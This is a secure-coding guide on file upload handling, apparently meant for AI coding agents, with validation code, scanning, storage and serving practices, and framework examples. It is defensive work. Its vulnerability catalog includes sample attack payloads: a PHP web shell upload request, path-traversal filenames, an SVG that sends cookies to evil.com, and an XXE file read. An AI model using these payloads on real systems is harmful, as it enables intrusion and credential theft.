# File Upload Security

> Expertise module for AI agents implementing secure file upload handling.
> Covers threat landscape, validation, malware scanning, cloud storage, and platform-specific guidance.

---

## 1. Threat Landscape

File upload functionality is one of the most dangerous features in web applications.
CWE-434 (Unrestricted Upload of File with Dangerous Type) consistently ranks in the
CWE Top 25 Most Dangerous Software Weaknesses. OWASP A04:2021 (Insecure Design)
and A01:2021 (Broken Access Control) both encompass file upload risks.

### 1.1 Attack Vectors

| Vector | Description | Severity |
|--------|-------------|----------|
| **Web shell upload** | Attacker uploads executable server-side script (.php, .jsp, .aspx) that provides remote command execution | Critical |
| **Malware distribution** | Platform used to host and distribute malware to downstream users | High |
| **Path traversal via filename** | Crafted filenames like `../../../etc/passwd` or `..\..\web.config` overwrite critical files | Critical |
| **Denial of service** | Extremely large files, ZIP bombs, or decompression bombs exhaust server resources | High |
| **Polyglot files** | Files valid as multiple types simultaneously (e.g., GIFAR: GIF + JAR) bypass type checks | High |
| **SSRF via URL-based upload** | "Upload from URL" features exploited to scan internal networks or access cloud metadata | High |
| **Stored XSS via SVG/HTML** | SVG files with embedded `<script>` tags or HTML files execute in user browsers | Medium |
| **XML External Entity (XXE)** | DOCX, XLSX, SVG files containing malicious XML entity declarations | High |

### 1.2 Real-World Breaches

**Equifax (2017) — CVE-2017-5638**
Attackers exploited an unpatched Apache Struts vulnerability in the Jakarta Multipart
parser (file upload handler) to achieve remote code execution. They deployed approximately
30 web shells across Equifax application servers, enabling direct command execution.
Over 147.9 million records were exfiltrated between May and July 2017. The vulnerability
had been patched two months prior, but Equifax failed to apply the update. Total cost
exceeded $1.38 billion.
Source: https://www.blackduck.com/blog/equifax-apache-struts-vulnerability-cve-2017-5638.html

**Volt Typhoon — Versa Director (2024) — CVE-2024-39717**
Chinese state-sponsored group exploited a zero-day in Versa Director's file upload
functionality to deploy the "VersaMem" web shell, stealing credentials and disrupting
critical infrastructure operations including Halliburton's IT systems.
Source: https://www.picussecurity.com/resource/blog/september-2024-latest-malware-vulnerabilities-and-exploits

**Cleo Managed File Transfer (2024)**
Critical flaws in Cleo's MFT products (Harmony, VLTrader, LexiCom) allowed unrestricted
file uploads leading to remote code execution, exploited actively in the wild.

**ImageTragick — CVE-2016-3714**
Insufficient filtering in ImageMagick's delegate feature allowed remote code execution
through crafted image files. The vulnerability affected versions 6.9.3-10 and earlier,
and 7.x before 7.0.1-1. Companion vulnerabilities included SSRF (CVE-2016-3718),
file deletion (CVE-2016-3715), file moving (CVE-2016-3716), and local file read
(CVE-2016-3717). Polyglot SVG/MSL files could bypass filters that only checked
file content type without fixing ImageMagick's processing policy.
Source: https://imagetragick.com/

**Magento E-Commerce Platform (2019)**
Unrestricted file upload vulnerability allowed attackers to upload web shells, compromising
thousands of online stores and exposing customer payment card data.

### 1.3 Attack Statistics

According to Verizon's Data Breach Investigations Report, insecure file handling is
linked to approximately 12% of breaches. A 2024 penetration testing study found that
35% of web applications blindly trusted the Content-Type header for file validation.

---

## 2. Core Security Principles

### 2.1 Defense-in-Depth Strategy

Never rely on a single validation mechanism. Layer multiple controls:

```
[Client Validation] → informational only, never trust
        ↓
[File Size Check] → reject before full upload if possible
        ↓
[Extension Allowlist] → reject disallowed extensions
        ↓
[Magic Bytes Validation] → verify actual file content type
        ↓
[Content Scanning] → malware/virus scan
        ↓
[Filename Sanitization] → generate random name, strip path components
        ↓
[Storage Isolation] → store outside webroot, non-executable directory
        ↓
[Serving Controls] → Content-Disposition, Content-Type, CSP headers
```

### 2.2 Fundamental Rules

1. **Validate file type by magic bytes, not just extension or Content-Type header.**
   The Content-Type header is client-supplied and trivially spoofed. Extensions can
   be manipulated with double extensions or null bytes.

2. **Maintain a strict allowlist of permitted file types.** Never use a denylist
   approach — there are too many dangerous file types to enumerate.

3. **Restrict file size at the web server and application level.** Set limits in
   nginx/Apache configuration AND in application code.

4. **Store uploads outside the webroot.** Uploaded files must never be directly
   accessible or executable by the web server.

5. **Generate random filenames.** Never use the original filename for storage. Use
   UUIDs or cryptographic random strings. Store the original name in a database if
   needed for display.

6. **Scan for malware before making files available.** Use ClamAV or a cloud-based
   scanning service. Quarantine files until scan completes.

7. **Serve files through a proxy with correct headers.** Set `Content-Disposition: attachment`,
   enforce correct `Content-Type`, and use a separate domain for user content.

8. **Strip metadata from images.** EXIF data can contain GPS coordinates, device info,
   and even embedded thumbnails of cropped content.

9. **Implement rate limiting on upload endpoints.** Prevent abuse and DoS via
   rapid repeated uploads.

10. **Log all upload activity.** Record uploader identity, original filename, detected
    type, file hash, storage path, and scan results.

---

## 3. Implementation Patterns

### 3.1 File Type Validation with Magic Bytes

Magic bytes (file signatures) are the authoritative indicator of file type. Common
signatures:

| Format | Magic Bytes (hex) | ASCII |
|--------|-------------------|-------|
| JPEG | `FF D8 FF` | n/a |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | .PNG.... |
| GIF | `47 49 46 38` | GIF8 |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |
| WEBP | `52 49 46 46 ?? ?? ?? ?? 57 45 42 50` | RIFF....WEBP |

**Node.js implementation using `file-type` library:**

```typescript
import { fileTypeFromBuffer } from 'file-type';

const ALLOWED_TYPES = new Map([
  ['image/jpeg', { extensions: ['jpg', 'jpeg'], maxSize: 10_000_000 }],
  ['image/png',  { extensions: ['png'],         maxSize: 10_000_000 }],
  ['image/webp', { extensions: ['webp'],        maxSize: 10_000_000 }],
  ['application/pdf', { extensions: ['pdf'],    maxSize: 50_000_000 }],
]);

async function validateFileType(buffer: Buffer): Promise<{
  valid: boolean;
  detectedType: string | null;
  error?: string;
}> {
  const result = await fileTypeFromBuffer(buffer);

  if (!result) {
    return { valid: false, detectedType: null, error: 'Unable to detect file type' };
  }

  if (!ALLOWED_TYPES.has(result.mime)) {
    return {
      valid: false,
      detectedType: result.mime,
      error: `File type '${result.mime}' is not allowed`,
    };
  }

  return { valid: true, detectedType: result.mime };
}
```

**Python implementation using `python-magic`:**

```python
import magic

ALLOWED_MIME_TYPES = {
    'image/jpeg', 'image/png', 'image/webp', 'application/pdf'
}

def validate_file_type(file_bytes: bytes) -> tuple[bool, str]:
    """Validate file type using magic bytes. Returns (is_valid, detected_mime)."""
    detected_mime = magic.from_buffer(file_bytes[:2048], mime=True)

    if detected_mime not in ALLOWED_MIME_TYPES:
        return False, detected_mime

    return True, detected_mime
```

### 3.2 Image Processing Sandboxing

Image processing libraries (ImageMagick, GraphicsMagick, libvips) have a history of
vulnerabilities. Isolate processing:

```typescript
// Use sharp (libvips wrapper) instead of ImageMagick
// sharp re-encodes images, stripping any embedded payloads
import sharp from 'sharp';

async function processUploadedImage(
  inputBuffer: Buffer,
  maxWidth = 2048,
  maxHeight = 2048,
): Promise<Buffer> {
  // Re-encoding through sharp neutralizes polyglot attacks
  // and strips EXIF metadata by default
  return sharp(inputBuffer)
    .resize(maxWidth, maxHeight, {
      fit: 'inside',
      withoutEnlargement: true,
    })
    .jpeg({ quality: 85, mozjpeg: true })
    .toBuffer();
}
```

**ImageMagick policy hardening** (`/etc/ImageMagick-7/policy.xml`):

```xml
<policymap>
  <!-- Disable dangerous coders -->
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />

  <!-- Resource limits -->
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="map" value="512MiB"/>
  <policy domain="resource" name="width" value="8192"/>
  <policy domain="resource" name="height" value="8192"/>
  <policy domain="resource" name="area" value="64MP"/>
  <policy domain="resource" name="disk" value="1GiB"/>
</policymap>
```

### 3.3 Virus Scanning with ClamAV

ClamAV is an open-source antivirus engine (GPLv2) suitable for scanning uploaded files.

**Architecture:**
```
Upload → Temp Storage → ClamAV Scan → Clean? → Permanent Storage
                                    → Infected? → Quarantine + Alert
```

**Node.js integration using `clamav.js`:**

```typescript
import NodeClam from 'clamscan';

const ClamScan = new NodeClam().init({
  clamdscan: {
    socket: '/var/run/clamav/clamd.ctl',  // Unix socket (preferred)
    host: '127.0.0.1',                     // TCP fallback
    port: 3310,
    timeout: 60000,
    localFallback: true,
  },
  preference: 'clamdscan',
});

async function scanFile(filePath: string): Promise<{
  clean: boolean;
  viruses: string[];
}> {
  const clamscan = await ClamScan;
  const { isInfected, viruses } = await clamscan.isInfected(filePath);

  return {
    clean: !isInfected,
    viruses: viruses ?? [],
  };
}

// Usage in upload pipeline
async function handleUpload(tempPath: string): Promise<void> {
  const scanResult = await scanFile(tempPath);

  if (!scanResult.clean) {
    await moveToQuarantine(tempPath);
    await alertSecurityTeam(scanResult.viruses);
    throw new Error('File failed malware scan');
  }

  await moveToStorage(tempPath);
}
```

**Important:** Keep ClamAV signature databases updated via `freshclam`. The clamd daemon
does not authenticate TCP traffic — always bind to localhost or use Unix sockets.

### 3.4 Cloud Storage with Signed URLs

Direct browser-to-cloud uploads via signed URLs reduce server load and attack surface.

**AWS S3 presigned URL generation (TypeScript):**

```typescript
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import { randomUUID } from 'crypto';

const s3 = new S3Client({ region: 'us-east-1' });

async function generateUploadUrl(
  contentType: string,
  maxSizeBytes: number,
): Promise<{ uploadUrl: string; key: string }> {
  // Validate content type server-side before generating URL
  const ALLOWED_CONTENT_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];
  if (!ALLOWED_CONTENT_TYPES.includes(contentType)) {
    throw new Error(`Content type '${contentType}' is not allowed`);
  }

  const key = `uploads/${randomUUID()}`;

  const command = new PutObjectCommand({
    Bucket: 'my-upload-bucket',
    Key: key,
    ContentType: contentType,
    // Server-side encryption
    ServerSideEncryption: 'AES256',
  });

  const uploadUrl = await getSignedUrl(s3, command, {
    expiresIn: 300, // 5 minutes
  });

  return { uploadUrl, key };
}
```

**S3 bucket policy for upload restrictions:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnencryptedUploads",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::my-upload-bucket/*",
      "Condition": {
        "StringNotEquals": {
          "s3:x-amz-server-side-encryption": "AES256"
        }
      }
    },
    {
      "Sid": "DenyPublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-upload-bucket/*",
      "Condition": {
        "Bool": { "aws:SecureTransport": "false" }
      }
    }
  ]
}
```

**Google Cloud Storage signed URL (Python):**

```python
from google.cloud import storage
from datetime import timedelta
import uuid

def generate_upload_signed_url(content_type: str, max_size: int) -> dict:
    client = storage.Client()
    bucket = client.bucket('my-upload-bucket')
    blob_name = f"uploads/{uuid.uuid4()}"
    blob = bucket.blob(blob_name)

    url = blob.generate_signed_url(
        version="v4",
        expiration=timedelta(minutes=5),
        method="PUT",
        content_type=content_type,
        headers={"x-goog-content-length-range": f"0,{max_size}"},
    )

    return {"upload_url": url, "blob_name": blob_name}
```

**Post-upload scanning pipeline (GCS):**
Google Cloud's reference architecture uses Cloud Functions triggered by storage events
to pass uploaded files through ClamAV. Clean files are moved to a "clean" bucket;
infected files are moved to a "quarantine" bucket.

### 3.5 Content-Disposition and Serving Headers

When serving user-uploaded files, always set defensive headers:

```typescript
app.get('/files/:fileId', async (req, res) => {
  const file = await getFileMetadata(req.params.fileId);

  // Force download — never render in browser
  res.setHeader('Content-Disposition',
    `attachment; filename="${encodeURIComponent(file.originalName)}"`);

  // Set accurate content type from stored metadata, not file extension
  res.setHeader('Content-Type', file.detectedMimeType);

  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Content Security Policy — block scripts in served content
  res.setHeader('Content-Security-Policy', "default-src 'none'; style-src 'unsafe-inline'");

  // Serve from a separate domain to isolate cookies
  // e.g., uploads.example.com instead of example.com

  const stream = await getFileStream(file.storagePath);
  stream.pipe(res);
});
```

### 3.6 Filename Sanitization

```typescript
import { randomUUID } from 'crypto';
import path from 'path';

function sanitizeAndRename(originalFilename: string, detectedMime: string): {
  storageFilename: string;
  originalName: string;
} {
  // Map detected MIME to safe extension
  const MIME_TO_EXT: Record<string, string> = {
    'image/jpeg': '.jpg',
    'image/png': '.png',
    'image/webp': '.webp',
    'application/pdf': '.pdf',
  };

  const safeExtension = MIME_TO_EXT[detectedMime] ?? '.bin';

  // Sanitize original name for display (remove path separators, null bytes)
  const sanitizedOriginal = path.basename(originalFilename)
    .replace(/[\x00-\x1f]/g, '')   // Remove control characters
    .replace(/[/\\]/g, '_')         // Replace path separators
    .slice(0, 255);                 // Limit length

  return {
    storageFilename: `${randomUUID()}${safeExtension}`,
    originalName: sanitizedOriginal,
  };
}
```

---

## 4. Vulnerability Catalog

### V-01: Extension Bypass — Double Extension

**CWE:** CWE-434
**Attack:** Upload `shell.php.jpg`. Some servers (Apache with misconfigured `mod_mime`)
execute the `.php` handler.

```
# Malicious filename examples
shell.php.jpg
shell.php%00.jpg       # Null byte injection (legacy)
shell.php;.jpg         # Semicolon bypass (IIS)
shell.pHp              # Case manipulation
shell.php5             # Alternative PHP extension
shell.phtml            # Another PHP extension
```

**Fix:** Validate against magic bytes, not extension. If extension checking is used,
extract only the final extension and compare against an allowlist.

### V-02: MIME Type Spoofing

**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
**Attack:** Set `Content-Type: image/jpeg` header while uploading a PHP web shell.

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--
```

**Fix:** Never trust the Content-Type header. Always validate using magic bytes from
the file content itself.

### V-03: Path Traversal in Filename

**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Attack:** Upload with filename `../../../etc/cron.d/backdoor` to write outside
the upload directory.

```python
# VULNERABLE — uses original filename
def save_upload(file):
    path = os.path.join('/uploads', file.filename)  # Path traversal!
    file.save(path)

# SECURE — generates random filename
def save_upload(file):
    ext = validate_and_get_extension(file)
    safe_name = f"{uuid.uuid4()}{ext}"
    path = os.path.join('/uploads', safe_name)
    # Additional safety: verify resolved path is within upload dir
    real_path = os.path.realpath(path)
    if not real_path.startswith(os.path.realpath('/uploads')):
        raise SecurityError("Path traversal detected")
    file.save(real_path)
```

### V-04: SVG with Embedded Scripts (Stored XSS)

**CWE:** CWE-79 (Cross-site Scripting)
**Attack:** Upload an SVG file containing JavaScript that executes when viewed.

```xml
<!-- Malicious SVG -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://evil.com/?c='+document.cookie</script>
  <rect width="100" height="100" fill="red"
        onload="fetch('https://evil.com/steal?cookie='+document.cookie)"/>
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
```

**Fix:** Either reject SVG uploads entirely, sanitize by stripping `<script>`,
`<foreignObject>`, and all `on*` attributes, or convert to rasterized format (PNG).
Serve with `Content-Type: image/svg+xml` and `Content-Security-Policy: default-src 'none'`.

### V-05: ZIP Bomb / Decompression Bomb

**CWE:** CWE-409 (Improper Handling of Highly Compressed Data)
**Attack:** A 42KB ZIP file expands to 4.5 petabytes when decompressed (e.g., 42.zip).
Nested ZIP files amplify exponentially.

**Fix:**
```python
import zipfile

MAX_UNCOMPRESSED_SIZE = 100 * 1024 * 1024  # 100 MB
MAX_FILES = 1000
MAX_NESTING_DEPTH = 2

def safe_extract(zip_path: str, extract_to: str, depth: int = 0) -> None:
    if depth > MAX_NESTING_DEPTH:
        raise SecurityError("Maximum archive nesting depth exceeded")

    with zipfile.ZipFile(zip_path, 'r') as zf:
        total_size = sum(info.file_size for info in zf.infolist())
        if total_size > MAX_UNCOMPRESSED_SIZE:
            raise SecurityError(f"Uncompressed size {total_size} exceeds limit")

        if len(zf.infolist()) > MAX_FILES:
            raise SecurityError(f"Archive contains too many files")

        # Check compression ratio
        compressed_size = os.path.getsize(zip_path)
        if compressed_size > 0 and total_size / compressed_size > 100:
            raise SecurityError("Suspicious compression ratio detected")

        for info in zf.infolist():
            # Prevent path traversal within archive
            if info.filename.startswith('/') or '..' in info.filename:
                raise SecurityError("Path traversal in archive entry")
            zf.extract(info, extract_to)
```

### V-06: SSRF via URL-Based Upload

**CWE:** CWE-918 (Server-Side Request Forgery)
**Attack:** "Upload from URL" feature abused to access internal services:
`http://169.254.169.254/latest/meta-data/` (AWS metadata),
`http://localhost:6379/` (Redis), `file:///etc/passwd`.

**Fix:** Validate and restrict URL schemes (HTTPS only), resolve DNS and reject
private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x, ::1),
use allowlisted domains if possible, and set strict timeouts.

### V-07: Missing Size Limits

**CWE:** CWE-770 (Allocation of Resources Without Limits)
**Attack:** Upload multi-gigabyte files to exhaust disk space, memory, or bandwidth.

**Fix:** Enforce limits at multiple layers — web server (nginx `client_max_body_size`),
reverse proxy, application framework, and application code.

### V-08: Executable Upload to Webroot

**CWE:** CWE-434
**Attack:** Upload `.php`, `.jsp`, `.aspx`, `.py`, `.cgi` file directly to a web-accessible
directory where the server executes it.

**Fix:** Store uploads outside the webroot. Configure the web server to never execute
files in upload directories. Serve through a separate application route with forced
`Content-Disposition: attachment`.

### V-09: XML External Entity in Document Uploads

**CWE:** CWE-611 (Improper Restriction of XML External Entity Reference)
**Attack:** DOCX, XLSX, SVG, and other XML-based formats can contain XXE payloads.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
```

**Fix:** Disable external entity processing in all XML parsers. For document processing,
use libraries with XXE protection enabled by default (e.g., `defusedxml` in Python).

### V-10: Polyglot File Attacks

**CWE:** CWE-434
**Attack:** Craft files that are simultaneously valid as two formats (e.g., a valid
JPEG that is also a valid PHP script, or a GIF that is also a JAR file — "GIFAR").

**Fix:** Re-encode/re-process files through format-specific libraries (e.g., re-save
images through sharp/Pillow). This destroys any embedded secondary payloads.

### V-11: Race Condition in Upload-Then-Scan

**CWE:** CWE-367 (Time-of-check Time-of-use)
**Attack:** Access uploaded file in the window between upload completion and virus
scan completion.

**Fix:** Upload to a quarantine/staging area that is not accessible. Only move to
the serving location after scan passes.

### V-12: Content-Type Mismatch on Serving

**CWE:** CWE-430 (Deployment of Wrong Handler)
**Attack:** Browser performs MIME sniffing and executes uploaded HTML/JavaScript files
despite the server sending a safe Content-Type.

**Fix:** Always set `X-Content-Type-Options: nosniff`. Send the correct Content-Type
from stored metadata. Serve user content from a separate domain.

### V-13: Metadata Exfiltration

**CWE:** CWE-200 (Exposure of Sensitive Information)
**Attack:** Uploaded images retain EXIF data containing GPS coordinates, device model,
timestamps, and sometimes thumbnails of pre-crop content.

**Fix:** Strip all metadata using sharp (`sharp(buf).rotate()` auto-strips EXIF) or
ExifTool. Re-encoding through an image library typically removes metadata.

### V-14: Insecure Direct Object Reference on Download

**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
**Attack:** Enumerate file IDs (`/download/1`, `/download/2`, ...) to access other
users' uploaded files.

**Fix:** Use unpredictable identifiers (UUIDs), enforce authorization checks on every
download request, and verify the requesting user has access to the specific file.

---

## 5. Security Checklist

Use this checklist when implementing or reviewing file upload functionality:

### Input Validation
- [ ] File type validated using magic bytes (not just extension or Content-Type header)
- [ ] Strict allowlist of permitted MIME types enforced
- [ ] File extension validated against allowlist (defense-in-depth, not sole check)
- [ ] Maximum file size enforced at web server AND application level
- [ ] Maximum upload count per request enforced
- [ ] Filename sanitized — path separators, null bytes, control characters removed
- [ ] Archive files (ZIP/TAR) checked for decompression bombs before extraction

### Storage & Processing
- [ ] Files stored outside the webroot in a non-executable directory
- [ ] Random/UUID filenames used for storage (original name stored in database)
- [ ] Upload directory has no execute permissions
- [ ] Antivirus/malware scan performed before file is made available
- [ ] Files quarantined until scan completes (no TOCTOU window)
- [ ] Images re-encoded through a safe library (sharp, Pillow) to strip payloads
- [ ] EXIF/metadata stripped from images before storage

### Serving & Access Control
- [ ] Files served with `Content-Disposition: attachment` (or inline only for safe types)
- [ ] `X-Content-Type-Options: nosniff` header set on all served files
- [ ] `Content-Security-Policy: default-src 'none'` set for served user content
- [ ] User content served from a separate domain (e.g., uploads.example.com)
- [ ] Authorization checked on every file access request
- [ ] Unpredictable file identifiers used (UUID, not sequential integer)

### Infrastructure
- [ ] Rate limiting applied to upload endpoints
- [ ] Upload activity logged (user, filename, type, hash, scan result)
- [ ] Cloud storage buckets configured with encryption-at-rest
- [ ] Presigned URLs used with short expiration times (5-15 minutes)

---

## 6. Tools & Automation

### 6.1 File Type Detection Libraries

| Language | Library | Notes |
|----------|---------|-------|
| Node.js | `file-type` | Detects binary formats via magic bytes; ESM-only since v17 |
| Node.js | `magic-bytes.js` | Lightweight; only needs first ~100 bytes of file |
| Node.js | `mmmagic` | Node binding to libmagic |
| Python | `python-magic` | Wrapper around libmagic; `magic.from_buffer(data, mime=True)` |
| Python | `filetype` | Pure Python, no system dependencies |
| Java | `Apache Tika` | Comprehensive content detection and extraction |
| Go | `http.DetectContentType` | Built-in, checks first 512 bytes |

### 6.2 Malware Scanning

| Tool | Type | Integration |
|------|------|-------------|
| **ClamAV** | Open-source antivirus | clamd daemon via Unix socket or TCP; `clamscan` CLI |
| **VirusTotal API** | Cloud multi-engine | REST API; 70+ AV engines; rate limits on free tier |
| **AWS GuardDuty Malware Protection** | AWS-native | Automatic scanning for S3 and EBS |
| **Google Cloud DLP** | GCP-native | Scans for sensitive data in uploaded content |
| **OPSWAT MetaDefender** | Commercial multi-engine | 30+ AV engines, deep CDR (Content Disarm & Reconstruction) |

### 6.3 Image Processing (Safe)

| Library | Language | Security Advantage |
|---------|----------|--------------------|
| **sharp** | Node.js (libvips) | Re-encodes images, strips metadata, fast |
| **Pillow** | Python | Re-encoding neutralizes polyglots; `Image.verify()` for validation |
| **libvips** | C (bindings for many languages) | Memory-efficient, sandboxed processing |

### 6.4 WAF File Upload Rules

- **AWS WAF:** Use size constraint rules to limit body size; custom rules to inspect
  Content-Type against allowlist
- **Cloudflare WAF:** Built-in rules for file upload attacks; custom rules for content
  type enforcement
- **ModSecurity (OWASP CRS):** Rules 921xxx cover file upload protections including
  content type validation and restricted extensions

### 6.5 Cloud Storage Security Configuration

**AWS S3:**
- Enable default encryption (SSE-S3 or SSE-KMS)
- Block all public access (`BlockPublicAcls`, `BlockPublicPolicy`, `IgnorePublicAcls`,
  `RestrictPublicBuckets`)
- Enable versioning for recovery from overwrites
- Enable access logging to a separate bucket
- Use VPC endpoints for internal access

**Google Cloud Storage:**
- Enable uniform bucket-level access (disable ACLs)
- Use Customer-Managed Encryption Keys (CMEK) for sensitive data
- Enable Object Versioning
- Configure retention policies where appropriate
- Use VPC Service Controls for perimeter security

---

## 7. Platform-Specific Guidance

### 7.1 Express.js with Multer

```typescript
import express from 'express';
import multer from 'multer';
import { fileTypeFromBuffer } from 'file-type';
import { randomUUID } from 'crypto';
import path from 'path';
import rateLimit from 'express-rate-limit';

// --- SECURE multer configuration ---
const UPLOAD_DIR = '/var/app/uploads'; // Outside webroot!
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB
const ALLOWED_MIMES = new Set(['image/jpeg', 'image/png', 'image/webp']);

const storage = multer.memoryStorage(); // Use memory for validation before saving

const upload = multer({
  storage,
  limits: {
    fileSize: MAX_FILE_SIZE,
    files: 1,           // Max files per request
    fields: 10,         // Max non-file fields
    fieldSize: 1024,    // Max field value size
  },
  fileFilter: (_req, file, cb) => {
    // First pass: check declared MIME (defense-in-depth, not sole check)
    if (!ALLOWED_MIMES.has(file.mimetype)) {
      return cb(new Error(`MIME type ${file.mimetype} not allowed`));
    }
    // Check extension
    const ext = path.extname(file.originalname).toLowerCase();
    const ALLOWED_EXTS = new Set(['.jpg', '.jpeg', '.png', '.webp']);
    if (!ALLOWED_EXTS.has(ext)) {
      return cb(new Error(`Extension ${ext} not allowed`));
    }
    cb(null, true);
  },
});

// Rate limit uploads
const uploadLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 20,                   // 20 uploads per window
  message: 'Too many uploads, please try again later',
});

const app = express();

app.post('/api/upload',
  uploadLimiter,
  upload.single('file'),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No file provided' });
      }

      // Second pass: validate magic bytes
      const typeResult = await fileTypeFromBuffer(req.file.buffer);
      if (!typeResult || !ALLOWED_MIMES.has(typeResult.mime)) {
        return res.status(400).json({
          error: 'File content does not match allowed types',
        });
      }

      // Generate safe filename
      const safeFilename = `${randomUUID()}.${typeResult.ext}`;
      const storagePath = path.join(UPLOAD_DIR, safeFilename);

      // Process image (re-encode to strip payloads/metadata)
      const sharp = (await import('sharp')).default;
      const processed = await sharp(req.file.buffer)
        .resize(2048, 2048, { fit: 'inside', withoutEnlargement: true })
        .toFormat(typeResult.ext as keyof sharp.FormatEnum)
        .toBuffer();

      // Scan for malware (if ClamAV available)
      // await scanBuffer(processed);

      // Save to disk
      const fs = await import('fs/promises');
      await fs.writeFile(storagePath, processed);

      // Store metadata in database
      // await db.files.create({ ... });

      return res.status(201).json({
        id: safeFilename.split('.')[0],
        originalName: req.file.originalname,
        size: processed.length,
        type: typeResult.mime,
      });
    } catch (err) {
      console.error('Upload error:', err);
      return res.status(500).json({ error: 'Upload failed' });
    }
  },
);

// Error handler for multer errors
app.use((err: any, _req: any, res: any, _next: any) => {
  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(413).json({ error: 'File too large' });
    }
    return res.status(400).json({ error: err.message });
  }
  if (err.message?.includes('not allowed')) {
    return res.status(400).json({ error: err.message });
  }
  return res.status(500).json({ error: 'Internal server error' });
});
```

### 7.2 Django File Upload Handling

```python
# settings.py
FILE_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024  # 5 MB
DATA_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024
FILE_UPLOAD_PERMISSIONS = 0o644
FILE_UPLOAD_DIRECTORY_PERMISSIONS = 0o755
MEDIA_ROOT = '/var/app/uploads'  # Outside webroot

# validators.py
import magic
import uuid
from django.core.exceptions import ValidationError
from django.core.validators import FileExtensionValidator

ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/webp'}
ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'webp']

def validate_file_content_type(uploaded_file):
    """Validate file type using magic bytes, not headers."""
    mime = magic.from_buffer(uploaded_file.read(2048), mime=True)
    uploaded_file.seek(0)  # Reset file pointer

    if mime not in ALLOWED_MIME_TYPES:
        raise ValidationError(
            f'File type {mime} is not allowed. '
            f'Allowed types: {", ".join(ALLOWED_MIME_TYPES)}'
        )

def validate_file_size(uploaded_file):
    max_size = 5 * 1024 * 1024
    if uploaded_file.size > max_size:
        raise ValidationError(f'File size exceeds {max_size // (1024*1024)}MB limit.')

# models.py
from django.db import models

class SecureUpload(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    file = models.FileField(
        upload_to='uploads/%Y/%m/',
        validators=[
            FileExtensionValidator(allowed_extensions=ALLOWED_EXTENSIONS),
            validate_file_content_type,
            validate_file_size,
        ],
    )
    original_filename = models.CharField(max_length=255)
    detected_mime = models.CharField(max_length=100)
    file_hash = models.CharField(max_length=64)  # SHA-256
    uploaded_by = models.ForeignKey('auth.User', on_delete=models.CASCADE)
    uploaded_at = models.DateTimeField(auto_now_add=True)
    scan_status = models.CharField(
        max_length=20,
        choices=[('pending', 'Pending'), ('clean', 'Clean'), ('infected', 'Infected')],
        default='pending',
    )

# views.py
from django.http import FileResponse, HttpResponseForbidden
import hashlib

def serve_file(request, file_id):
    upload = SecureUpload.objects.get(id=file_id)

    # Authorization check
    if not request.user.has_perm('view_upload', upload):
        return HttpResponseForbidden()

    if upload.scan_status != 'clean':
        return HttpResponseForbidden('File is not available')

    response = FileResponse(upload.file, content_type=upload.detected_mime)
    response['Content-Disposition'] = (
        f'attachment; filename="{upload.original_filename}"'
    )
    response['X-Content-Type-Options'] = 'nosniff'
    response['Content-Security-Policy'] = "default-src 'none'"
    return response
```

### 7.3 Spring Boot (Java) — MultipartFile

```java
@RestController
@RequestMapping("/api/uploads")
public class FileUploadController {

    private static final Set<String> ALLOWED_TYPES =
        Set.of("image/jpeg", "image/png", "image/webp");
    private static final long MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB
    private static final Path UPLOAD_DIR = Paths.get("/var/app/uploads");

    @PostMapping
    public ResponseEntity<?> uploadFile(
            @RequestParam("file") MultipartFile file,
            Authentication auth) {

        // Size check
        if (file.isEmpty() || file.getSize() > MAX_FILE_SIZE) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Invalid file size"));
        }

        try {
            // Validate content type via magic bytes using Apache Tika
            Tika tika = new Tika();
            String detectedType = tika.detect(file.getInputStream());

            if (!ALLOWED_TYPES.contains(detectedType)) {
                return ResponseEntity.badRequest()
                    .body(Map.of("error", "File type not allowed: " + detectedType));
            }

            // Generate safe filename
            String extension = switch (detectedType) {
                case "image/jpeg" -> ".jpg";
                case "image/png"  -> ".png";
                case "image/webp" -> ".webp";
                default -> ".bin";
            };
            String safeFilename = UUID.randomUUID() + extension;
            Path targetPath = UPLOAD_DIR.resolve(safeFilename);

            // Verify path is within upload directory (prevent traversal)
